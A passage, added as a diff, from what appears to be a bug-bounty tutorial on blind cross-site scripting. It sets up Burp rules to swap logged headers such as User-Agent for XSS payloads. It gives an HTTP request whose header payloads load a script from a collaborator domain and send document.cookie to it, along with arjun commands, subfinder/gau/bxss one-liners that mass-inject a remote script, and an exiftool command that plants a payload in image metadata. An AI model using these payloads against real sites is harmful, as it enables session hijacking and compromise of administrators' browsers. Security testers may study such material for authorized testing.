@@ -1,0 +1,56 @@
+https://github.com/SeifElsallamy/Blind-XSS-Manager?source=post_page-----fc9e6ced5b0b---------------------------------------
+https://github.com/mandatoryprogrammer/xsshunter-express?source=post_page-----fc9e6ced5b0b---------------------------------------
+https://xss.report/?source=post_page-----fc9e6ced5b0b---------------------------------------
+https://github.com/SeifElsallamy/Blind-XSS-Manager?source=post_page-----fc9e6ced5b0b---------------------------------------
+
+Here’s how to set it up:
+
+Navigate to Proxy > Settings > Match and Replace.
+Click ‘Add’ to create a new rule.
+Set the rule to replace a common request header, like the User-Agent, with your Blind XSS payload.
+
+Why the User-Agent header? Many backend systems log visitor information, including their browser’s User-Agent string. If an administrator views these logs through a vulnerable internal panel, our payload will execute.
+
+After setting the rule, I can browse the target site, fill out a form, and capture the request in Burp. The HTTP history will confirm that the User-Agent was replaced with my payload before being forwarded to the server.
+
+You can apply this same logic to other headers that are commonly logged, such as:
+
+Referer
+Origin
+Cookie
+Accept
+Host
+X-Forwarded-For
+
+GET /some/path HTTP/1.1
+Host: target.example.com
+User-Agent: <script src="https://YOUR-COLLAB.DOMAIN"></script>
+Referer: https://YOUR-COLLAB.DOMAIN/?r=ref
+X-Forwarded-For: 127.0.0.1, https://YOUR-COLLAB.DOMAIN/
+X-Api-Version: <svg onload="new Image().src='https://YOUR-COLLAB.DOMAIN/?c='+document.cookie"></svg>
+Cookie: session=abc; extra=<img src=x onerror="new Image().src='https://YOUR-COLLAB.DOMAIN/?c='+document.cookie">
+
+
+https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg?source=post_page-----fc9e6ced5b0b---------------------------------------
+
+
+
+Step 5: Scaling Up with Automation Scripts
+For broader testing, we can turn to command-line tools.
+
+Arjun: This tool is excellent for discovering hidden HTTP parameters. A hidden parameter could belong to a form or API endpoint that isn’t visible on the website, giving you a unique injection point.
+
+
+arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"
+
+arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10  --headers "User-Agent: Mozilla/5.0"
+
+
+BXSS One-Liner Tools: There are powerful scripts available that automate the entire process. You simply provide a target domain, your Blind XSS payload, and a list of headers to inject into.
+subfinder -d vulnweb.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+subfinder -d vulnweb.com | gau | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"
+
+
+exiftool -Comment='"><img src=x onerror=alert(1)>' test.jpg
+
+
